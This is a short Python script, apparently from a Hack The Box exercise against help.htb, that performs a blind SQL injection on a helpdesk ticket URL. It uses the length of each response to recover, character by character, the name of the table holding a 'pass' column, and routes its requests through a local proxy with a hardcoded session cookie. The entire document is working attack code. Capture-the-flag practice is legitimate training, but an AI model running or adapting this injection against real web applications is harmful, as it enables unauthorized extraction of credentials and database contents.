

import requests
import string
import warnings
#warnings.filterwarnings("ignore")


proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}

headers = {'Cookie': 'lang=english; PHPSESSID=20q6sd4sfdodqrkk71u2cu7701; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BEvwgMfmNMCNC%2FrrvtMz5waMHeN%2BAVjpAQJY4xaIMzEsQ%3D%3D'}


def searchTable():

	## put the name of column in like '%here%' to find the table which contains the column we are searching for
 
	url = "http://help.htb/support/?v=view_tickets&action=ticket&param%5B%5D=4&param%5B%5D=attachment&param%5B%5D=1&param%5B%5D=6+and+(select+1+from+dual+where+(select+table_name+from+information_schema.columns+where+table_schema%3ddatabase()+and+column_name+like+'%25pass%25'+limit+0,1)+like+'" 

	for i in range(0,16):
      
		i = i+1
      

      

		for a in string.ascii_lowercase + string.digits[1:]:
		 part1 = url + a + "%25')+--+-"

		 r = requests.get(part1, headers=headers, proxies=proxies, verify=False)
		 t = len(r.content)

		 if t == 78881:
		    print("Table_name chars "+a)
		    url = url + a
		    print(a)

searchTable()
